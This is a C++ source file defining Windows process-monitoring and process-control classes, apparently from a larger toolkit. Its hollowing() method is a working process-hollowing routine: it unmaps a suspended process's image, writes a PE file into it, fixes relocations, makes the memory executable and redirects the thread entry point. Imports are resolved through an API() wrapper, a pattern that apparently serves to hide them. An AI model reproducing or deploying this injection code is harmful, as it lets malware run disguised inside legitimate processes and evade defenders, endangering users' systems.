#include "pch.h"
#include "process.h"

namespace core {
	ProcessMonitor::ProcessMonitor() noexcept
	{
		clearLocalVariable();
	}

	ProcessMonitor::ProcessMonitor(int pid) : ProcessMonitor()
	{
		pe = getEntry<PROCESSENTRY32W>(FINDP_BY_PID, pid);
		te = getEntry<THREADENTRY32>(FINDT_BY_PARENT_PID, pid);
	}

	ProcessMonitor::ProcessMonitor(const WCHAR* processName) : ProcessMonitor()
	{
		pe = getEntry<PROCESSENTRY32W>(FINDP_BY_NAME, processName);
		te = getEntry<THREADENTRY32>(FINDT_BY_PARENT_PID, pe.th32ProcessID);
	}

	int ProcessMonitor::getPid(const WCHAR* processName)
	{
		return getEntry<PROCESSENTRY32W>(FINDP_BY_NAME, processName).th32ProcessID;
	}

	int ProcessMonitor::getTid(const WCHAR* processName)
	{
		return getEntry<THREADENTRY32>(FINDT_BY_PARENT_PID, getPid(processName)).th32ThreadID;
	}

	const WCHAR* ProcessMonitor::getName() const
	{
		if (pe.th32ProcessID == -1) {
			return nullptr;
		}
		return pe.szExeFile;
	}

	const WCHAR* ProcessMonitor::getName(const WCHAR* processName)
	{
		return getEntry<PROCESSENTRY32W>(FINDP_BY_NAME, processName).szExeFile;
	}

	void ProcessMonitor::clearLocalVariable() noexcept
	{
		initPEntry(pe);
		initTEntry(te);
	}


	Process::Process()
	{
		clearLocalVariable();
	}

	Process::Process(int pid, int pAccess, int tAccess) : Process()
	{
		ProcessMonitor monitor(pid);
		if (!monitor.isExist()) {
			return;
		}
		if (pAccess == -1) pAccess = tAccess = PROCESS_ALL_ACCESS;
		if (tAccess == -1) tAccess = pAccess;

		open(monitor.getPid(), monitor.getTid(), pAccess, tAccess);
	}

	Process::Process(Process&& other) noexcept : Process()
	{
		swap(*this, other);
	}

	Process& Process::operator=(Process&& other) noexcept
	{
		if (this == &other) {
			return *this;
		}
		Process process(core::move(other));
		swap(*this, process);
		return *this;
	}

	Process::~Process()
	{
		kill();
		close();
	}

	bool Process::open(int pId, int tId, int pAccess, int tAccess)
	{
		if (ProcessMonitor::getEntry<THREADENTRY32>(ProcessMonitor::FINDT_BY_PID, tId).th32ThreadID == -1 ||
			ProcessMonitor::getEntry<PROCESSENTRY32W>(ProcessMonitor::FINDP_BY_PID, pId).th32ProcessID == -1) return false;

		if (tAccess == -1) tAccess = pAccess;

		clearLocalVariable();

		pi.dwProcessId = pId;
		pi.dwThreadId = tId;
		pi.hProcess = API(KERNEL32, OpenProcess)(pAccess, FALSE, pId);
		pi.hThread = API(KERNEL32, OpenThread)(tAccess, FALSE, tId);

		return isOpen();
	}

	bool Process::run(const WCHAR* exetutable, WCHAR* args, int creationFlag)
	{
		bool res = static_cast<bool>(API(KERNEL32, CreateProcessW)(exetutable, args, 0, 0, 0, creationFlag, 0, 0, &si, &pi));
		if (!res) {
			clearLocalVariable();
		}
		else {
			if (!(creationFlag & CREATE_SUSPENDED)) {
				_isSuspended = false;
			}
		}
		return res;
	}

	bool Process::hollowing(const WCHAR* name) {
		bool ret = false;
		if (!isOpen() || !isSuspended()) {
			return false;
		}

		DWORD len = 0;
		PVOID pbaddr = 0;
		NTSTATUS status;
		PROCESS_BASIC_INFORMATION pbi;

		if (!NT_SUCCESS(API_ALWAYS(NTDLL, NtQueryInformationProcess)(pi.hProcess, ProcessBasicInformation, &pbi, sizeof pbi, &len))) {
			return false;
		}

		PEB pebt;
		if (!API(KERNEL32, ReadProcessMemory)(pi.hProcess, (LPCVOID)pbi.PebBaseAddress, &pebt, sizeof pebt, 0)) {
			return false;
		}

		pbaddr = pebt.Reserved3[1];
		if (!NT_SUCCESS(API_ALWAYS(NTDLL, NtUnmapViewOfSection)(pi.hProcess, pbaddr))) {
			return false;
		}

		HANDLE file = API(KERNEL32, CreateFileW)(name, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

		if (file != INVALID_HANDLE_VALUE) {
			DWORD readed;
			LARGE_INTEGER lsz;
			API(KERNEL32, GetFileSizeEx)(file, &lsz);
			uint8_t* tdata = (uint8_t*)core::alloc(lsz.QuadPart);

			if (tdata != nullptr && API(KERNEL32, ReadFile)(file, tdata, lsz.QuadPart, &readed, 0)) {
				LOADED_IMAGE loadim;
				PIMAGE_NT_HEADERS nt;
				Process::GetLoadedImage((size_t)tdata, &loadim);
				nt = Process::GetNTHeaders((size_t)tdata);

				PVOID premim = API(KERNEL32, VirtualAllocEx)(pi.hProcess, pbaddr, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
				if (premim) {
					size_t dwDelta = (size_t)pbaddr - nt->OptionalHeader.ImageBase;
					nt->OptionalHeader.ImageBase = (size_t)pbaddr;

					if (API(KERNEL32, WriteProcessMemory)(pi.hProcess, pbaddr, tdata, nt->OptionalHeader.SizeOfHeaders, 0)) {
						for (size_t i = 0; i < loadim.NumberOfSections; i++)
						{
							if (!loadim.Sections->PointerToRawData)
								continue;

							PVOID pSecDest = (PVOID)((size_t)pbaddr + loadim.Sections[i].VirtualAddress);
							API(KERNEL32, WriteProcessMemory)(pi.hProcess, pSecDest, &tdata[loadim.Sections[i].PointerToRawData], loadim.Sections[i].SizeOfRawData, 0);
						}

						if (dwDelta)
						{
							for (size_t i = 0; i < loadim.NumberOfSections; i++) {
								if (API(KERNEL32, lstrcmpA)(".reloc", (LPCSTR)loadim.Sections[i].Name))
									continue;

								DWORD dwOffset = 0;
								DWORD dwRelocAddr = loadim.Sections[i].PointerToRawData;
								IMAGE_DATA_DIRECTORY relocData = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

								while (dwOffset < relocData.Size) {
									PBASE_RELOCATION_BLOCK pBlockheader =
										(PBASE_RELOCATION_BLOCK)&tdata[dwRelocAddr + dwOffset];

									dwOffset += sizeof(BASE_RELOCATION_BLOCK);

									PBASE_RELOCATION_ENTRY pBlocks =
										(PBASE_RELOCATION_ENTRY)&tdata[dwRelocAddr + dwOffset];

									for (size_t j = 0; j < CountRelocationEntries(pBlockheader->BlockSize); j++) {
										dwOffset += sizeof(BASE_RELOCATION_ENTRY);

										if (pBlocks[j].Type == 0)
											continue;

										size_t dwBuffer = 0;
										size_t dwFieldAddress = pBlockheader->PageAddress + pBlocks[j].Offset;
										API(KERNEL32, ReadProcessMemory)(pi.hProcess, (PVOID)((size_t)pbaddr + dwFieldAddress), &dwBuffer, sizeof(size_t), 0);

										dwBuffer += dwDelta;

										BOOL bSuccess = API(KERNEL32, WriteProcessMemory)(pi.hProcess, (PVOID)((size_t)pbaddr + dwFieldAddress), &dwBuffer, sizeof(size_t), 0);
									}
								}
							}

							DWORD oldp;
							if (API(KERNEL32, VirtualProtectEx)(pi.hProcess, premim, nt->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldp)) {
								CONTEXT context;
								context.ContextFlags = CONTEXT_FULL;

								if (API(KERNEL32, GetThreadContext)(pi.hThread, &context)) {
#ifndef _WIN64
									context.Eax = (size_t)pbaddr + nt->OptionalHeader.AddressOfEntryPoint;
#else
									context.Rcx = (size_t)pbaddr + nt->OptionalHeader.AddressOfEntryPoint;
#endif

									if (API(KERNEL32, SetThreadContext)(pi.hThread, &context)) {
										ret = (API(KERNEL32, ResumeThread)(pi.hThread) != (DWORD)-1);
									}
								}
							}
						}
					}
				}
			}
			if (tdata != nullptr) core::free(tdata);
			API(KERNEL32, CloseHandle)(file);
		}
		return ret;
	}

	bool Process::suspend()
	{
		return isOpen() ? API(KERNEL32, SuspendThread)(pi.hThread) != -1 : false;
	}

	bool Process::resume()
	{
		return  isOpen() ? API(KERNEL32, ResumeThread)(pi.hThread) != -1 : false;
	}

	bool Process::kill()
	{
		if (!isOpen()) {
			return false;
		}

		bool res = API(KERNEL32, TerminateProcess)(pi.hProcess, 1);
		close();
		return res;
	}

	void Process::close()
	{
		if (pi.hProcess != nullptr) API(KERNEL32, CloseHandle)(pi.hProcess);
		if (pi.hThread != nullptr) API(KERNEL32, CloseHandle)(pi.hThread);
		clearLocalVariable();
	}
	void Process::clearLocalVariable()
	{
		_isSuspended = true;
		core::zeromem(&si, sizeof si);
		core::zeromem(&pi, sizeof pi);
		si.cb = sizeof STARTUPINFO;
		pi.dwProcessId = pi.dwThreadId = -1;
	}
	void Process::swap(Process& a, Process& b) noexcept
	{
		core::swap(a.si, b.si);
		core::swap(a.pi, b.pi);
	}
}